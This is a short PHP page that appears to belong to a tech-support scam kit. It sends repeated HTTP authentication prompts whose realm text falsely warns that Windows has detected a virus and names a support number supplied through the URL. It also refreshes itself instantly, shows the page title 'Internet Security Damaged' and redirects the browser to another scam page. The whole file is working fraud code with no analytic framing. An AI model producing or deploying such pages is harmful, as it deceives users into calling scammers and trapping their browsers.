<?php
header('WWW-Authenticate: Basic realm="Warning: Windows Has Detected a Malicious Virus On Your System !! Call for support '.htmlspecialchars($_GET["num"]) .' "');
header('Location: report.php');
header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
$sec = "0";
header("Refresh: $sec; url=$page");
echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";
?>
<script type="text/javascript">window.location="edge.php";</script>